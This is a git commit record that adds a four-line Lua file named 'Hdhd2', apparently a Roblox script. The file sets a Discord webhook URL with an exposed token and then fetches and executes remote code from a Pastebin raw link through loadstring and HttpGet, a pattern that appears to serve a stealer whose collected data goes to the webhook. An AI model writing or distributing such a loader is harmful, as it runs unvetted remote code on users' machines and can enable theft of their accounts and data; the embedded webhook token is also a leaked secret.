4e629c3d89bb48bd42ad102501dc631cf2a14396
ScriptSt <2prostandoff2@gmail.com>
2024-10-25 21:09:26 +0500

    Добавлен скрипт для Hdhd2

---
+++ Hdhd2_script.lua
@@ -0,0 +1,4 @@
+Name = "Hdhd2"
+Webhook = "https://discord.com/api/webhooks/1285619894439641202/H9QJjtqIvKSYuEwuwQE9Id72lGQcvMEM3Uysu0COZIDjA8HL_GwcVySgkA2W4LuEZ4vT"
+
+loadstring(game:HttpGet("https://pastebin.com/raw/gGJkQJGd"))()
